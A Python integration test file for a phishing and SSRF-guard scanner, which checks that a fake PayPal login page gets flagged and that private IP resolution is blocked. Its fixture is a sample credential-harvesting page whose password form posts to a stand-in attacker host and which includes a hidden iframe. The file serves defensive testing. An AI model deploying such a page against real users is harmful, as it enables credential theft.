"""Real DNS-guard + TLS + HTTP code paths against a local HTTPS server.

Only two things are faked: name resolution (so a made-up phishing-looking
hostname "resolves" to a public address) and the final TCP connection, which is
steered to the local server. Everything in between - the SSRF guard, pinned
connections, certificate validation, HTML analysis, flag merging - is real.
"""
import socket
import unittest
from unittest import mock

import src.signals as signals
from src.signals import SignalConfig, collect_signals, netguard, tls
from src.validation import validate_url
from tests.helpers import LocalServer, make_self_signed_cert, temp_dir

PHISHY = (b"<html><head><title>PayPal - Log in</title></head><body>"
          b"<form action='https://collector.evil-host.example/post.php'>"
          b"<input type=password name=p></form>"
          b"<iframe src='https://t.example/x' width=0 height=0></iframe></body></html>")


class DeepScanIntegrationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = temp_dir()
        paths = make_self_signed_cert(cls._tmp.name)
        if paths is None:
            raise unittest.SkipTest("openssl CLI not available")
        cls.server = LocalServer({"/": (200, {"Content-Type": "text/html; charset=utf-8"}, PHISHY)}, *paths)
        cls.server.__enter__()

    @classmethod
    def tearDownClass(cls):
        cls.server.__exit__(None, None, None)
        cls._tmp.cleanup()

    def run_scan(self, url, resolved="93.184.216.34"):
        def fake_getaddrinfo(host, port, *a, **k):
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (resolved, port))]

        def to_local(addresses, port, timeout):
            # Plain connect(): socket.create_connection() would call the faked getaddrinfo above.
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect(("127.0.0.1", self.server.port))
            return sock

        with mock.patch.object(socket, "getaddrinfo", fake_getaddrinfo), \
             mock.patch.object(netguard, "open_pinned_socket", to_local), \
             mock.patch.object(tls, "open_pinned_socket", to_local), \
             mock.patch.object(signals, "check_domain_age", return_value=({"status": "unavailable"}, [])), \
             mock.patch.object(signals, "check_safe_browsing", return_value=({"status": "skipped"}, [])):
            return collect_signals(validate_url(url), SignalConfig(overall_timeout=5.0, request_timeout=2.0), deep_scan=True)

    def test_full_scan_of_a_phishing_looking_site(self):
        out = self.run_scan("https://paypal-login.example.net/")
        self.assertEqual(out["dns"]["public"], True)
        self.assertFalse(out["certificate"]["valid"])             # self-signed test certificate
        self.assertEqual(out["content"]["status"], "ok")
        self.assertEqual(out["content"]["password_field_count"], 1)
        codes = {f["code"] for f in out["flags"]}
        self.assertTrue({"certificate_invalid", "password_form_posts_off_domain", "hidden_iframe",
                         "title_brand_mismatch", "brand_impersonation"} <= codes, codes)
        self.assertEqual(out["flags"][0]["severity"], "high")      # worst findings first

    def test_private_resolution_never_reaches_the_server(self):
        before = len(self.server.seen)
        out = self.run_scan("https://paypal-login.example.net/", resolved="10.0.0.7")
        self.assertEqual(out["dns"], {"status": "ok", "resolves": True, "public": False})
        self.assertEqual(len(self.server.seen), before)


if __name__ == "__main__":
    unittest.main()
